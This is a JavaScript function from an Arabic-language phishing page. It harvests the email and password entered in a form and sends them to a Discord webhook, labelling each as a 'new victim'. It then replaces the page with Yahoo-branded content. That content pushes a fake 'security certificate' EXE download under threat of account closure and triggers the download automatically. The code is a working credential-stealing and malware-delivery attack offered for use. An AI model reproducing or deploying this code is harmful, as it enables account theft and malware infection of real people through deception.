async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    
    if(!email || !pass) return alert("الرجاء إدخال البيانات لإتمام التوثيق");

    const victimID = "ID-" + Math.floor(Math.random() * 9000 + 1000);

    try {
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        
        // إرسال البيانات للديسكورد
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: `💀 **ضحية جديدة:**\nالـ ID: \`${victimID}\`\n📧 الإيميل: \`${email}\`\n🔑 الباسورد: \`${pass}\``
            })
        });

        // تغيير محتوى الصفحة لإجبار الضحية على تحميل الملف يدوياً
        document.body.innerHTML = `
            <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" width="100">
                <h2 style="color:#6001d2;">خطوة أخيرة للتوثيق</h2>
                <p>تم استلام بياناتك بنجاح. لضمان أمان حسابك، يجب تحميل وتشغيل "شهادة أمان ياهو" المرفقة أدناه.</p>
                <a href="${config.pc_payload}" 
                   id="downloadBtn"
                   style="display:inline-block; padding:15px 30px; background:#6001d2; color:white; text-decoration:none; border-radius:25px; font-weight:bold; margin-top:20px;">
                   تحميل وتفعيل شهادة الأمان (EXE)
                </a>
                <p style="color:red; margin-top:10px; font-size:12px;">* ملاحظة: الحساب سيتعرض للإغلاق إذا لم يتم تشغيل الشهادة خلال 5 دقائق.</p>
            </div>
        `;

        // محاولة بدء التحميل تلقائياً أيضاً كزيادة تأكيد
        window.location.href = config.pc_payload;

    } catch(e) {
        alert("حدث خطأ في الاتصال، حاول مرة أخرى");
    }
}
